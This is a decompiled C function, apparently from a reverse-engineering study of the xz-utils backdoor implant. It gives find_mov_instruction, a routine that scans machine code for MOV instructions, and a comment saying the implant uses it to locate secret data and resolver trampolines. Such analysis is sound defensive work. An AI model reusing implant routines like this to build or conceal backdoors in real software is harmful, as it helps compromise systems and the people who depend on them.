// /home/kali/xzre-ghidra/xzregh/100E00_find_mov_instruction.c
// Function: find_mov_instruction @ 0x100E00
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_mov_instruction(u8 * code_start, u8 * code_end, BOOL is_64bit_operand, BOOL load_flag, dasm_ctx_t * dctx)


/*
 * AutoDoc: Searches for MOV instructions with configurable load/store semantics and hands back the matched operands. It underpins many of
 * the signature searches the implant runs while deriving addresses for secret data or resolver trampolines.
 */

#include "xzre_types.h"

BOOL find_mov_instruction
               (u8 *code_start,u8 *code_end,BOOL is_64bit_operand,BOOL load_flag,dasm_ctx_t *dctx)

{
  BOOL BVar1;
  long lVar2;
  dasm_ctx_t *pdVar3;
  BOOL bVar4;
  dasm_ctx_t local_80;
  
  pdVar3 = &local_80;
  for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
    *(undefined4 *)&pdVar3->instruction = 0;
    pdVar3 = (dasm_ctx_t *)((long)&pdVar3->instruction + 4);
  }
  if (dctx == (dasm_ctx_t *)0x0) {
    dctx = &local_80;
  }
  do {
    while( TRUE ) {
      if (code_end <= code_start) {
        return FALSE;
      }
      BVar1 = x86_dasm(dctx,code_start,code_end);
      if (BVar1 != FALSE) break;
      code_start = code_start + 1;
    }
    if ((((dctx->prefix).decoded.modrm.modrm_word & 0xff00ff00) == 0x5000000) &&
       (((((dctx->prefix).decoded.rex.rex_byte & 0x48) == 0x48) == is_64bit_operand ||
        (load_flag == FALSE)))) {
      if (load_flag == FALSE) {
        bVar4 = *(int *)(dctx->opcode_window + 3) == 0x109;
      }
      else {
        bVar4 = *(int *)(dctx->opcode_window + 3) == 0x10b;
      }
      if (bVar4) {
        return TRUE;
      }
    }
    code_start = code_start + dctx->instruction_size;
  } while( TRUE );
}

